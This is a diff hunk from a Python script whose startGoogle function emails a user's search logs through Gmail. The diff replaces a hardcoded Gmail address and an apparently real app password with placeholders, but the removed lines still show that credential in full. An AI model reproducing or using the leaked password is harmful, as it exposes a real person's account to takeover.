@@ -66,9 +66,9 @@ def startGoogle():
         mail_content = "Hello, this is a search logs from your user. Thank you have a nice day :)"
         
         # SETUP THE SENDER AND RECEIVER
-        sender_email_address = 'gabsendio04@gmail.com'
-        sender_password = 'xnupfbcwrrornppp'
-        receiver_email_address = 'gabsendio04@gmail.com'
+        sender_email_address = 'sender@gmail.com'
+        sender_password = 'sender password'
+        receiver_email_address = 'receiver@gmail.com'
         
         # SETUP THE MIME
         message = MIMEMultipart()
